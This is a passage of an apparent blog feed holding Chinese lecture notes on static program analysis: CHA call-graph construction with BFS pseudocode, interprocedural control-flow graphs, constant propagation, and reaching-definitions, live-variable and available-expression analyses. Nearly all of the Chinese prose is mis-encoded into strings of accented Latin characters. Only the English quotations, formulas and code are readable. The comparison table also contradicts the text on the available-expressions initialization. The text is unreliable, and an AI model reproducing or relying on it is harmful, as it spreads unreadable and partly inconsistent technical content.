href="#ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG" class="headerlink" title="ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG"></a>ç”¨CHAæ„é€ æ•´ä¸ªç¨‹åºCG</h2><ol><li><p>ä»ä¸€äº›å…¥å£å‡½æ•°å¼€å§‹ï¼ˆå¦‚<code>main()</code>ï¼‰</p></li><li><p>å¯¹äºæ¯ä¸€ä¸ªåˆ°è¾¾çš„æ–¹æ³• $m$ï¼Œç”¨CHAè§£æå…¶ä¸­æ¯ä¸ªcall sitesï¼Œå³ï¼ˆ$Resolve(cs)$ï¼‰</p></li><li><p>é‡å¤ç›´åˆ°æ²¡æœ‰æ–°çš„å‡½æ•°éœ€è¦è¢«å‘ç°</p></li></ol><p>å¯ä»¥ç”¨DFSæˆ–è€…BFSå®ç°ï¼Œ ä»¥ä¸‹ä¸ºBFSæœç´¢ç®—æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BuildCallGraph(m_entry):</span><br><span class="line">WL = [m_entry] <span class="comment"># å·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line">CG = &#123;&#125; <span class="comment"># å­˜æ”¾callgraphï¼Œè¾¹çš„é›†åˆ</span></span><br><span class="line">RM = &#123;&#125; <span class="comment"># å¯è¾¾çš„æ–¹æ³•ï¼ˆbookï¼‰</span></span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">remove m <span class="keyword">from</span> WL</span><br><span class="line">    <span class="keyword">if</span> m âˆ‰ RM then add m to RM</span><br><span class="line">        <span class="comment"># é€šè¿‡ CHA è§£æm()ä¸­çš„æ‰€æœ‰è°ƒç”¨ cs</span></span><br><span class="line">    <span class="keyword">for</span> cs <span class="keyword">in</span> m:</span><br><span class="line">     T = Resolve(cs)</span><br><span class="line"><span class="keyword">for</span> target_method <span class="keyword">in</span> T:</span><br><span class="line">add (cs â†’ target_method) to CG <span class="comment"># å°†è°ƒç”¨åŠ å…¥åˆ°Callgraphä¸­</span></span><br><span class="line">add target_method to WL</span><br><span class="line"><span class="keyword">return</span> CG</span><br></pre></td></tr></table></figure><h1 id="Interprocedural-Control-Flow-Graph"><a href="#Interprocedural-Control-Flow-Graph" class="headerlink" title="Interprocedural Control-Flow Graph"></a>Interprocedural Control-Flow Graph</h1><p>ICFGï¼ˆInterprocedural Control-Flow Graphï¼‰ï¼Œåœ¨CFGåŸºç¡€ä¸ŠåŠ ä¸ŠCall edgeså’ŒReturn edges</p><ul><li>Call edgesï¼šä»è°ƒç”¨ç‚¹ï¼ˆcall sitesï¼‰å‡ºå‘è‡³è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleesï¼‰</li><li>Return edgesï¼šä»è¢«è°ƒå‡½æ•°returnè¯­å¥å‡ºå‘è‡³è°ƒç”¨ç‚¹çš„ä¸‹ä¸€æ¡è¯­å¥ï¼ˆreturn sitesï¼‰</li></ul><p>e.g.,<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200818202917677.png" alt="image-20200818202917677"></p><p>æ³¨æ„åœ¨æ·»åŠ ä¸¤æ¡è¾¹åï¼ŒåŸå…ˆçš„è¾¹å¹¶ä¸åˆ å»ã€‚</p><h1 id="Interprocedural-Data-Flow-Analysis"><a href="#Interprocedural-Data-Flow-Analysis" class="headerlink" title="Interprocedural Data-Flow Analysis"></a>Interprocedural Data-Flow Analysis</h1><p>è¿‡ç¨‹é—´æ•°æ®æµåˆ†æå³åœ¨ ICFG ä¸Šåšåˆ†æ</p><p>åœ¨ Transfer functions ä¸­é™¤äº† CFG ä¸­çš„ Node transfer è¿˜åŠ äº† edge transferï¼š</p><ul><li>Call edge transferï¼šåœ¨ call node è‡³ callee çš„ç¬¬ä¸€ä¸ªnode ä¸Šä¼ é€’æ•°æ®æµï¼ˆä¼ å‚æ•°ï¼‰</li><li>Return edge transferï¼šåœ¨ return node è‡³ return site ä¸Šä¼ é€’æ§åˆ¶æµï¼ˆä¼ è¿”å›å€¼ï¼‰</li></ul><h2 id="Interprocedural-Constant-Propagation"><a href="#Interprocedural-Constant-Propagation" class="headerlink" title="Interprocedural Constant Propagation"></a>Interprocedural Constant Propagation</h2><p>è¿‡ç¨‹é—´æ•°æ®æµåˆ†æå¹¶æ²¡æœ‰åƒè¿‡ç¨‹å†…åˆ†æé‚£æ ·æœ‰è§„èŒƒçš„ç®—æ³•ï¼Œè¿™é‡Œä»¥å¸¸é‡ä¼ æ’­ä¸ºä¾‹ï¼Œè§£é‡Šè¿‡ç¨‹é—´åˆ†æè¿‡ç¨‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆè¿‡ç¨‹é—´åˆ†æï¼‰/image-20200818204421280.png" alt="image-20200818204421280"></p><p>å¯¹äºéå‡½æ•°è°ƒç”¨è¯­å¥ï¼Œä»ç„¶ç”¨node transferå¤„ç†ï¼Œé‡åˆ°å‡½æ•°è°ƒç”¨ï¼ˆcall expressionï¼‰æ—¶ï¼š</p><ol><li>killæ‰å·¦è¾¹çš„å˜é‡çš„å€¼</li><li>ç”± <strong>Call edge transfer</strong> å°†å®å‚ä¼ é€’è‡³callee enter å¤„ï¼Œåœ¨calleeä¸Šä¸‹æ–‡åšè¿‡ç¨‹é—´åˆ†æ</li><li>åˆ†æè‡³callee returnæ—¶ï¼Œç”±<strong>Return edge transfer</strong>å°†è‡³ä¼ å›callerä¸Šä¸‹æ–‡</li></ol><p><strong>å…³äºæ˜¯å¦ä¿ç•™call-to-return edgeï¼š</strong></p><p>ä¿ç•™call-to-return edgeï¼Œå¯ä»¥ä¿ç•™callerä¸Šä¸‹æ–‡æ•°æ®å˜é‡ï¼Œè‹¥æ²¡æœ‰è¿™æ¡è¾¹åˆ™éœ€è¦æŠŠå½“å‰å‡½æ•°ä¸Šä¸‹æ–‡å˜é‡ä¼ è¿›è¢«è°ƒå‡½æ•°ï¼ˆå¦‚åˆ†æ <code>ten()</code> æ—¶ï¼Œéœ€è¦ä¼ é€’<code>a, b, c</code>ï¼‰ï¼Œè¿™æ˜¯ä½æ•ˆçš„ã€‚</p><p><strong>æ³¨æ„</strong>åœ¨call expressionæ—¶ï¼Œå…ˆæŠŠleftçš„å€¼killæ‰ï¼ˆå¦‚è°ƒç”¨<code>ten()</code>æ˜¯ï¼Œå…ˆæŠŠbçš„å€¼killï¼Œå¦åˆ™ä¼šäº§ç”Ÿå†²çªï¼‰</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚ä¸»è¦è®²äº†è¿‡ç¨‹é—´åˆ†æä¸»è¦æ–¹æ³•ï¼Œå³å…ˆç”ŸæˆCallgraphï¼Œå†åˆæˆICFGè¿›è¡Œæ•°æ®æµåˆ†æï¼Œå¹¶ä¸”ä»‹ç»äº†ä¸€ä¸ªç®€å•çš„ç”ŸæˆCallGraphçš„æ–¹æ³•â€”â€”CHAï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°CHAæœ‰è¾ƒå¤§ç¼ºé™·ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Motivation&quot;&gt;&lt;a href=&quot;#Motivation&quot; class=&quot;headerlink&quot; title=&quot;Motivation&quot;&gt;&lt;/a&gt;Motivation&lt;/h1&gt;&lt;p&gt;è¿‡ç¨‹å†…åˆ†æé‡åˆ°å‡½æ•°è°ƒç”¨åªèƒ½åšä¿å®ˆå‡è®¾ï¼Œå¯¼è‡´è¿‡å¤šè¯¯æŠ¥ï¼Œè€Œè¿‡ç¨‹é—´åˆ†æå¯ä»¥è·Ÿè¿›è¢«è°ƒå‡½æ•°ï¼Œå› æ­¤æ›´å‡†ç¡®.&lt;/p&gt;&lt;h1 id=&quot;Call-Graph-Construction&quot;&gt;&lt;a href=&quot;#Call-Graph-Construction&quot; class=&quot;headerlink&quot; title=&quot;Call Graph Construction&quot;&gt;&lt;/a&gt;Call Graph Construction&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt; A call graph is a set of call edges from  call-sites to their target methods (callees)&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="è¿‡ç¨‹é—´åˆ†æ" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E5%BA%94%E7%94%A8%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/</id>
    <published>2020-08-02T09:34:13.000Z</published>
    <updated>2020-10-04T03:34:30.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Overview-amp-Preliminaries"><a href="#Overview-amp-Preliminaries" class="headerlink" title="Overview &amp;  Preliminaries"></a>Overview &amp;  Preliminaries</h1><p>ä¸¤ç±»åˆ†æï¼š</p><ul><li>may Analysisï¼šover-approximation</li><li>must Analysisï¼šunder-approximation</li></ul><p>å®é™…ä¸Šéƒ½æ˜¯ä¸ºäº†safety of analysisã€‚</p><h2 id="å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š"><a href="#å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š" class="headerlink" title="å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š"></a>å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š</h2><a id="more"></a><p>è§£é‡Šä¸€ï¼š</p><blockquote><p>An analysis to figure out â€œhow <strong>application-specific Data</strong> Flows through the <strong>Nodes(BBs/statements)</strong> and <strong>Edges(control flows) </strong>of CFG(a program)?â€</p></blockquote><p>å¯¹äºapplication-specific dataï¼Œç”±å¯¹å˜é‡æˆ–è¡¨è¾¾å¼<strong>æŠ½è±¡ï¼ˆAbstractionï¼‰</strong>è¡¨ç¤ºï¼›å¯¹äºNodesï¼Œç”±<strong>Transfer function</strong>å¤„ç†ï¼›å¯¹äºEdgesï¼Œæœ‰<strong>Control-flow handing</strong>å¤„ç†ã€‚</p><p>Abstractionã€Transfer functionå’ŒControl-flow handingæ˜¯è®¾è®¡ä¸€ä¸ªæ•°æ®æµåˆ†æçš„ä¸‰ä¸ªå…³é”®è¦ç´ ã€‚</p><p>è§£é‡ŠäºŒï¼š</p><blockquote><p>In each data-flow analysis application, we associate with every program point a data-flow value that represents an abstraction of the set of all possible program states that can be observed for that point.</p></blockquote><p>æ§åˆ¶æµåˆ†æå³ç»™å‡ºæ¯ä¸€ä¸ªç¨‹åºç‚¹ä¸€ä¸ªæ§åˆ¶æµçš„å€¼ï¼Œè¯¥å€¼æ˜¯è¡¨ç¤ºåœ¨è¯¥ç‚¹èƒ½åˆ†æåˆ°çš„æ‰€æœ‰å¯èƒ½ç»“æœçš„æŠ½è±¡è¡¨ç¤ºã€‚</p><p>è§£é‡Šä¸‰ï¼š</p><blockquote><p>Data-flow analysis is to find a solution to a set of safe-approximation-directed constraints on the IN[s]â€™s and OUT[s]â€™s, for all statements $s$.</p></blockquote><p>æ§åˆ¶æµåˆ†æå³åœ¨safe-approximationè§„åˆ™ï¼ˆmay or mastï¼‰çº¦æŸä¸‹ï¼Œè§£å‡ºæ¯ä¸€ä¸ªstatementsçš„INå’ŒOUTã€‚</p><p>è¿™é‡Œçš„INå’ŒOUTæŒ‡æ¯ä¸€ä¸ªè¯­å¥çš„è¾“å…¥å’Œè¾“å‡ºã€‚</p><p>è¿™é‡Œçš„çº¦æŸåŒ…å«äº†è¯­ä¹‰ï¼ˆè½¬æ¢å‡½æ•°ï¼‰å’Œæ§åˆ¶æµä¿¡æ¯ï¼ˆControl-flow Handingï¼‰ã€‚</p><h2 id="è½¬æ¢å‡½æ•°ï¼ˆtransfer-functionï¼‰"><a href="#è½¬æ¢å‡½æ•°ï¼ˆtransfer-functionï¼‰" class="headerlink" title="è½¬æ¢å‡½æ•°ï¼ˆtransfer functionï¼‰"></a>è½¬æ¢å‡½æ•°ï¼ˆtransfer functionï¼‰</h2><p>åˆ†æå•ä¸ªBBçš„å‡½æ•°ï¼Œå­˜åœ¨å‰å‘åˆ†æå’Œåå‘åˆ†æï¼š</p><ul><li><p>å‰å‘åˆ†æï¼ˆForward Analysisï¼‰<br>$Out[s]=f_s(IN[s])$</p></li><li><p>åå‘åˆ†æï¼ˆBackward Analysisï¼‰ï¼Œå°†CFGåå‘ç­‰äºForward<br>$In[s]=f_s(OUT[s])$</p></li></ul><h2 id="æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow-Handlingï¼‰"><a href="#æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow-Handlingï¼‰" class="headerlink" title="æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow Handlingï¼‰"></a>æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow Handlingï¼‰</h2><p>å®šä¹‰æ•°æ®æµåœ¨BBsé—´çš„æµåŠ¨æ–¹å¼ï¼Œæ§åˆ¶æµä¸­çš„BBså­˜åœ¨ä¸‰ç§æƒ…å†µï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802175052488.png" alt="image-20200802175052488"></p><p>åä¸¤ç§æƒ…å†µå­˜åœ¨äº¤æ±‡(meet)æ“ä½œï¼ˆç¬¬äºŒç§åå‘åˆ†æå­˜åœ¨ï¼‰</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802175345773.png" alt="image-20200802175345773"></p><p>å¯¹äºç¬¬ä¸‰ç§æƒ…å†µä¸‹çš„å‰å‘åˆ†æï¼ŒBçš„INæ˜¯æ‰€æœ‰å…¥å‘çš„ä»£ç å—OUTçš„meetï¼›å¯¹äºç¬¬äºŒç§æƒ…å†µä¸‹çš„åå‘åˆ†æï¼ŒBçš„OUTæ˜¯æ‰€æœ‰å‡ºå‘ä»£ç å—INçš„meetã€‚</p><h1 id="Reaching-Definitions-Analysis"><a href="#Reaching-Definitions-Analysis" class="headerlink" title="Reaching Definitions Analysis"></a>Reaching Definitions Analysis</h1><blockquote><p>A definition $d$ at program point $p$ reaches a point $q$ if there is a path from $p$ to $q$ such that $d$ is not â€œkilledâ€ along that path.</p></blockquote><p>å¯¹äºåœ¨ç¨‹åºç‚¹ $p$ å¤„å˜é‡vçš„<strong>å®šä¹‰d</strong>ï¼Œæ£€æµ‹å…¶åœ¨$ p\sim q$çš„è·¯å¾„ä¸Šæ˜¯å¦æœ‰æ–°çš„å®šä¹‰ï¼ˆå¯ä»¥ç”¨äºç©ºæŒ‡é’ˆé—®é¢˜ï¼‰</p><h2 id="ç®—æ³•è®¾è®¡"><a href="#ç®—æ³•è®¾è®¡" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Values<br> ç”¨bit vecotrè¡¨ç¤ºé›†åˆï¼Œé›†åˆä¸­å…ƒç´ è¡¨ç¤ºæ¯ä¸€åˆ°è¾¾è¯¥ç‚¹çš„è¯­å¥<br> e.g. D1, D2, â€¦ , Dn=01â€¦0 (è¡¨ç¤ºD2å®šä¹‰åœ¨å½“ä¸”ä½ç½®æœ‰æ–°å®šä¹‰)</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> <strong>Transfer Functionï¼š</strong><br> å¯¹äºä¸€ä¸ªå®šä¹‰è¯­å¥<code>D: v = x op y</code>ï¼Œkillï¼ˆåœ¨é›†åˆï¼‰ä¸vç›¸å…³çš„å…¶ä»–è¯­å¥ï¼Œå¹¶åœ¨é›†åˆä¸­åŠ å…¥Dï¼Œå³ï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><p> <strong>Control-flow Handingï¼š</strong><br> å½“å¤šä¸ªä»£ç å—æ±‡èšæ—¶ï¼Œåˆå¹¶æ‰€æœ‰çš„å®šä¹‰ï¼ˆmayï¼‰</p><script type="math/tex; mode=display">\mathrm{IN}[B]=\bigcup_{P \text { a predecessor of } B} OUT [P]</script></li><li><p>åº”ç”¨ç»å…¸çš„æ•°æ®æµåˆ†æç®—æ³•æ¡†æ¶ï¼ˆIterative algorithmï¼‰<br> <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/8890_1.png" alt="Iterative algorithm"></p><h2 id="éå†ç»“æœ"><a href="#éå†ç»“æœ" class="headerlink" title="éå†ç»“æœ"></a>éå†ç»“æœ</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802193730918.png" alt="image-20200802193730918"></p></li></ol><h2 id="ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹-fixed-point"><a href="#ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹-fixed-point" class="headerlink" title="ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹(fixed point)"></a>ä¸ºä»€ä¹ˆèƒ½åˆ°ä¸åŠ¨ç‚¹(fixed point)</h2><p>å†æ¬¡è€ƒè™‘Transfer Functionï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><ul><li>å› ä¸º genå’Œkillæ˜¯ä¸å˜çš„</li><li>å½“æ–°çš„å˜åŒ–è¿›æ¥æ—¶ï¼Œç»è¿‡killsï¼Œå­˜åœ¨$survivor_s$åŠ å…¥OUT[S]</li><li>å› æ­¤é‚£äº›åŠ å…¥åˆ°OUT[S]çš„æ–°å˜åŒ–ï¼Œè¦ä¹ˆæ¥è‡ªäºgenï¼Œè¦ä¹ˆæ¥è‡ªäº$survivor_s$ï¼Œè€Œè¿™äº›å˜åŒ–å°†æ°¸è¿œä¿ç•™ï¼ˆé›†åˆä¸­æ°¸è¿œå­˜åœ¨è¿™äº›ä½ç½®ï¼‰</li><li>å› æ­¤OUTçš„å˜åŒ–æ˜¯å•è°ƒå¢çš„(åªä¼š0-&gt;1,1-&gt;1)</li></ul><p>æ€»ç»“ä¸‹æ¥ï¼Œæ¯ä¸ªBBçš„Transfer Functionæ˜¯ä¸€ä¸ªå•è°ƒå¢å‡½æ•°ï¼Œåˆå› ä¸ºå€¼åŸŸæ˜¯æœ‰ä¸Šé™çš„ï¼ˆæœ€å¤§ä¸åŠ¨ç‚¹ï¼‰ï¼Œå› æ­¤ç®—æ³•æœ€ç»ˆä¼šåœæ­¢ã€‚</p><h1 id="Live-Variable-Analysis"><a href="#Live-Variable-Analysis" class="headerlink" title="Live Variable Analysis"></a>Live Variable Analysis</h1><blockquote><p>Live variables analysis tells whether the value of variable $v$ at program point $p$ could be used along some path in CFG starting at $p$. If so , $v$ is live at $p$; otherwise, $v$ is dead at $p$.</p></blockquote><p>å¯¹äºåœ¨CFGç¨‹åºç‚¹ $p$ä¸Šå®šä¹‰çš„<strong>å˜é‡ $v$ </strong>ï¼Œåœ¨$p$ä¸Šå˜é‡$v$çš„å€¼åœ¨åç»­æ‰§è¡Œä¸­è¿˜è¢«è¯»å–ï¼ˆ$v$ åœ¨ä½¿ç”¨å‰ä¸è¢«é‡æ–°å®šä¹‰ï¼‰ï¼Œé‚£ä¹ˆç§° $v$ åœ¨ $p$ ä¸Šæˆæ´»ã€‚<br>ï¼ˆä½¿ç”¨åœºæ™¯ï¼šå¯„å­˜å™¨ç”¨å®Œä¹‹åï¼Œæ£€æŸ¥å“ªä¸ªå¯„å­˜å™¨å¯ä»¥è¢«æ¸…é™¤â€”â€”è‹¥å¯„å­˜å™¨ä¸­çš„å˜é‡deadï¼‰</p><h2 id="ç®—æ³•è®¾è®¡-1"><a href="#ç®—æ³•è®¾è®¡-1" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Valuesï¼Œä¾ç„¶ç”¨bit vectorï¼Œ<strong>æ³¨æ„è¿™æ¬¡è®°å½•å˜é‡</strong><br> å¦‚ï¼šV1,V2,â€¦,Vn=01â€¦0 ï¼ˆV2åœ¨pä¸Šçš„å®šä¹‰è¢«ä½¿ç”¨i.e.,ä¸èƒ½æ¸…ç©ºV2å¯„å­˜å™¨ï¼‰</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> è®¨è®ºforwardè¿˜æ˜¯backwardï¼Œ<strong>æŠŠå˜é‡å½“å¯„å­˜å™¨æƒ³</strong>ï¼Œå½“å†³å®šä¸€ä¸ªå¯„å­˜å™¨æ˜¯å¦å¯ä»¥æ¸…ç©ºçš„æ—¶å€™ï¼Œéœ€è¦å¾€åçœ‹ï¼Œåé¢çš„ç¨‹åºæ˜¯å¦ç”¨åˆ°è¿™ä¸ªå¯„å­˜å™¨ï¼Œå› æ­¤ç”¨backwardã€‚</p><p> <strong>Transfer Functionï¼š</strong></p><script type="math/tex; mode=display">\mathrm{IN}[B]=use_{B} \cup\left(\mathrm{OUT}[B]-def_{B}\right)</script><p> å…¶ä¸­ï¼Œ$IN[B]$æŒ‡våœ¨Bä¸­é‡å®šä¹‰å‰è¢«ä½¿ç”¨ï¼Œ$OUT[B]$æŒ‡våœ¨Bä»£ç å—ä¸­æ²¡æœ‰é‡å®šä¹‰ï¼Œ$def_B$æŒ‡våœ¨Bä¸­è¢«é‡å®šä¹‰ã€‚</p><p> <strong>Control-flow Handingï¼š</strong></p><p> may analysisï¼Œä¾æ—§æ˜¯âˆªï¼š</p><script type="math/tex; mode=display">\mathrm{OUT}[\mathrm{B}]=\bigcup_{S \text{ a successor of B}}  {\mathrm{IN}[\mathrm{S}]}</script></li><li><p>ä¸åŠ¨ç‚¹ç®—æ³•<br>  <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802203143027.png" alt="image-20200802203143027"></p><h2 id="åˆ†æç»“æœ"><a href="#åˆ†æç»“æœ" class="headerlink" title="åˆ†æç»“æœ"></a>åˆ†æç»“æœ</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802202534370.png" alt="image-20200802202534370"></p></li></ol><h1 id="Avaliable-Expression-Analysis"><a href="#Avaliable-Expression-Analysis" class="headerlink" title="Avaliable Expression Analysis"></a>Avaliable Expression Analysis</h1><blockquote><p>An expression $x \text{ op } y$ is available at program point $p$ if (1) all paths from the entry to $p$ must passthrough the evaluation of , $x \text{ op } y$and (2) after the last evaluation of $x \text{ op } y$, there is no redefinition of $x \text{ op } y$.</p></blockquote><p>è¡¨è¾¾å¼ $x \text{ op } y$ ä¸ºavailbable å½“ä¸”ä»…å½“ ï¼ˆ1ï¼‰æ‰€æœ‰è·¯å¾„éƒ½ç»è¿‡ $x \text{ op } y$ ï¼ˆ2ï¼‰æœ€åä¸€ä¸ªè®¡ç®—  $x \text{ op } y$ åï¼Œä¸å†æœ‰ $x$ å’Œ$y$ çš„é‡æ–°èµ‹å€¼ã€‚</p><p>å¦‚æœè¡¨è¾¾å¼availableï¼Œåˆ™ä¼˜åŒ–æœ€åä¸€æ¬¡çš„è®¡ç®—ï¼Œä¾‹å¦‚ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802204136008.png" alt="image-20200802204136008"></p><p>cå¯ä»¥è¢«ä¼˜åŒ–ï¼Œä¾‹å¦‚ï¼Œå°†aï¼Œbï¼Œcå…¨è½¬åŒ–ä¸ºyï¼Œæœ€åä¸€æ­¥åˆ™ä¸ç”¨è®¡ç®—ï¼ˆä¸è®ºèµ°ä»€ä¹ˆåˆ†æ”¯ï¼Œæœ€åçš„téƒ½ä¸ç”¨è®¡ç®—ï¼‰</p><h2 id="ç®—æ³•è®¾è®¡-2"><a href="#ç®—æ³•è®¾è®¡-2" class="headerlink" title="ç®—æ³•è®¾è®¡"></a>ç®—æ³•è®¾è®¡</h2><ol><li><p>Data Flow Values<br> availableçš„è¡¨è¾¾å¼é›†åˆï¼Œå¯ç”¨bitVectorè¡¨ç¤ºï¼Œå¦‚ï¼š</p><p>E1,E2,â€¦,En=01â€¦0(E2ä¸ºavailable)</p></li><li><p>å®šä¹‰Transfer Functionå’ŒControl-flow Handing</p><p> <strong>Transfer Functionï¼š</strong></p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-kill_{B}\right)</script><p> è¿™é‡Œçš„$kill_{B}$æŒ‡åˆ é™¤è¡¨è¾¾å¼ï¼Œè¿™äº›è¡¨è¾¾å¼çš„å˜é‡åœ¨å½“å‰å—Bä¸­è¢«é‡æ–°å®šä¹‰ã€‚</p><p> <strong>Control-flow Handingï¼š</strong></p><script type="math/tex; mode=display">\mathrm{N}[B]=\bigcap_{P a \text { predecessor of } B} OUT [P]</script><p> must analysisï¼Œç”±â€œâˆªâ€å˜æˆäº†â€œâˆ©â€</p></li><li><p>ç®—æ³•ï¼Œæ³¨æ„æ¯ä¸ªbbçš„åˆå§‹åŒ–ï¼Œå˜æˆäº†â€œAllâ€ï¼Œå³åˆå§‹çŠ¶æ€æ‰€æœ‰è¡¨è¾¾å¼éƒ½æ˜¯availableçš„ï¼ˆåå‘æ€ç»´ï¼Œå¦‚æœåˆå§‹åŒ–ä¸º0ï¼Œé‚£ä¹ˆ$\cap$åæ’ä¸º0ï¼Œè®¡ç®—æ— æ•ˆï¼‰<br> <img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802205253641.png" alt="image-20200802205253641"></p></li></ol><h1 id="ç»¼åˆæ¯”è¾ƒ"><a href="#ç»¼åˆæ¯”è¾ƒ" class="headerlink" title="ç»¼åˆæ¯”è¾ƒ"></a>ç»¼åˆæ¯”è¾ƒ</h1><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available</th></tr></thead><tbody><tr><td>Domain(ç ”ç©¶å¯¹è±¡çš„é›†åˆ)</td><td>å®šä¹‰é›†åˆ</td><td>å˜é‡é›†åˆ</td><td>è¡¨è¾¾å¼é›†åˆ</td></tr><tr><td>Direction(æ•°æ®çŠ¶æ€çš„ä¾èµ–å…³ç³»)</td><td>Forwards</td><td>Backwards</td><td>Forwards</td></tr><tr><td>May/Must(åº”ç”¨åœºæ™¯)</td><td>May</td><td>May</td><td>Must</td></tr><tr><td>Boundary(Direction&amp;May/Must)</td><td>$\mathrm{OUT}[entry]=\emptyset$</td><td>$\mathrm{IN}[exit]=\emptyset$</td><td>$\mathrm{OUT}[entry]=\emptyset$</td></tr><tr><td>Initialization(Direction&amp;May/Must)</td><td>$\mathrm{B}[entry]=\emptyset$</td><td>$\mathrm{In}[B]=\emptyset$</td><td>$\mathrm{OUT}[B]=\emptyset$</td></tr><tr><td>Transfer function</td><td>$\mathrm{OUT}=gen \cup (\mathrm{IN}-kill)$</td><td>-</td><td>-</td></tr><tr><td>Meet(May/Must)</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div><h1 id="å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£"><a href="#å¯¹äºæ•°æ®æµåˆ†æè§£é‡Šä¸‰çš„ç†è§£" class="headerlink" 